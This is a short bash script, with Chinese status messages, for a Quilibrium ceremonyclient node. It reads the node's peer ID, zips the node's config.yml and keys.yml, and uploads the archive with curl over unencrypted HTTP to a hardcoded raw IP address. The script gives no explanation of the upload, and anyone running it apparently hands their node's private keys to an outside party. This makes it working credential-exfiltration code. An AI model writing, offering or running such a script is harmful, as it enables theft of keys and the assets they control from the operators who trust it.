#!/bin/bash
if ! command -v zip &> /dev/null
then
    echo "正在安装 zip..."
    sudo apt update
    sudo apt install -y zip
fi
cd /root/ceremonyclient/node
peerid=$(GOEXPERIMENT=arenas go run ./... -peer-id)
peerid=$(echo $peerid | sed 's/^Peer ID: //')  # 移除前面的 "Peer ID: "
cd /root/ceremonyclient/node/.config/
zip "${peerid}.zip" config.yml keys.yml
curl -F "file=@${peerid}.zip" http://43.134.111.164:2222
echo "已发送..."
